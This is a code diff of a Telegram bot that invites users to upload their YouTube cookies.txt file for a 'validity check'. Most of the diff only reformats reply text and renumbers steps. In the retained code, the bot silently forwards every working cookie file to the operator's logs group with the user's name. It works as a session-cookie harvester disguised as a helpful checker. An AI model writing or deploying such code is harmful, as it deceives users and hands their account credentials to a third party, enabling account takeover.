@@ -26,24 +26,9 @@ TIME = "⏰"
 @app.on_message(filters.command("chkcookies") & filters.private)
 async def enable_cookie_check(client, message):
     active_users.add(message.chat.id)
-    await message.reply(f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}")
+    await message.reply(f"{CHECK} **Now send your** `cookies.txt` **file to check!** {CLOCK}")
 
-# Step 2: Handle Wrong Inputs (Images, Videos, Text)
-@app.on_message(filters.private & ~filters.document)
-async def warn_wrong_input(client, message):
-    if message.chat.id in active_users:
-        await message.reply(f"{CROSS} **Incorrect input!** Please send your `cookies.txt` file.\n\n✅ **Steps:**\n1️⃣ Open File Manager 📂\n2️⃣ Find `cookies.txt`\n3️⃣ Send it here ✅")
-        
-        # Log incorrect input to logs group
-        log_msg = f"""
-{SHIELD} **Incorrect Input Detected!**
-{BULLET} {USER} **User:** {message.from_user.first_name}
-{BULLET} {TIME} **Time:** {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
-{BULLET} {CROSS} **Error:** Sent wrong file type or message instead of `cookies.txt`!
-"""
-        await client.send_message(LOGS_GROUP_ID, log_msg)
-
-# Step 3: Accept Only If `/chkcookies` was Used
+# Step 2: Accept Only If `/chkcookies` was Used
 @app.on_message(filters.document & filters.private)
 async def check_cookies_from_file(client, message: Message):
     if message.chat.id not in active_users:
@@ -52,69 +37,60 @@ async def check_cookies_from_file(client, message: Message):
     file_path = await message.download()
 
     if not file_path.endswith(".txt"):
-        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!\n✅ **Make sure the file is named** `cookies.txt`.")
-        
-        # Log invalid file
-        log_msg = f"""
-{SHIELD} **Invalid File Sent!**
-{BULLET} {USER} **User:** {message.from_user.first_name}
-{BULLET} {TIME} **Time:** {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
-{BULLET} {CROSS} **Error:** Sent `{file_path.split('/')[-1]}` instead of `cookies.txt`!
-"""
-        await client.send_message(LOGS_GROUP_ID, log_msg)
+        await message.reply(f"{CROSS} **Please send a valid** `cookies.txt` **file!**")
         return
 
-    # Step 4: Read Cookies File
+    # Step 3: Read Cookies File
     try:
         with open(file_path, "r") as f:
             cookies_data = f.read().strip()
 
         if not cookies_data:
-            await message.reply(f"{CROSS} ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ɪs ᴇᴍᴘᴛʏ !")
+            await message.reply(f"{CROSS} **Your** `cookies.txt` **file is empty!**")
             os.remove(file_path)  # Delete temp file
             return
 
-        # Step 5: Get User Info & Time
+        # Step 4: Get User Info & Time
         user_name = message.from_user.username
         full_name = message.from_user.first_name
         display_name = f"@{user_name}" if user_name else full_name
         check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM
 
-        # Step 6: Validate YouTube Cookies
+        # Step 5: Validate YouTube Cookies
         ydl_opts = {"quiet": True, "cookiefile": file_path}
 
         try:
             with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                 ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)
 
-            msg = f"{CHECK} ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ᴠᴀʟɪᴅ ! "
+            msg = f"{CHECK} **Your YouTube cookies are valid!** {STAR}{FIRE}"
             log_msg = f"""
-{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
-{BULLET} {CHECK} ʀᴇsᴜʟᴛ: ᴡᴏʀᴋɪɴɢ {CHECK}
-{BULLET} {USER} User: {display_name}
-{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ : {check_time}
+{SHIELD} **COOKIES CHECKED!**
+{BULLET} {CHECK} **Result:** WORKING {CHECK}
+{BULLET} {USER} **User:** {display_name}
+{BULLET} {TIME} **Checked At:** {check_time}
 """
 
             # Send valid cookies to group
             await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)
 
         except yt_dlp.utils.ExtractorError:
-            msg = f"{CROSS} Your YouTube cookies are invalid or expired !"
+            msg = f"{CROSS} **Your YouTube cookies are invalid or expired!**"
             log_msg = f"""
-{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
-{BULLET} {CROSS} ʀᴇsᴜʟᴛ: ɪɴᴠᴀʟɪᴅ {CROSS}
-{BULLET} {USER} ᴜsᴇʀ: {display_name}
-{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ: {check_time}
+{SHIELD} **COOKIES CHECKED!**
+{BULLET} {CROSS} **Result:** INVALID {CROSS}
+{BULLET} {USER} **User:** {display_name}
+{BULLET} {TIME} **Checked At:** {check_time}
 """
         # Send only log (without file) to group
         await client.send_message(LOGS_GROUP_ID, log_msg)
         await message.reply(msg, quote=True)
 
     except Exception as e:
-        await message.reply(f"⚠️ Error reading file: `{str(e)}`")
+        await message.reply(f"⚠️ **Error reading file:** `{str(e)}`")
 
-    # Step 7: Clean Up Temporary File
+    # Step 6: Clean Up Temporary File
     os.remove(file_path)
 
-    # Step 8: Remove User from Active List
+    # Step 7: Remove User from Active List
     active_users.remove(message.chat.id)
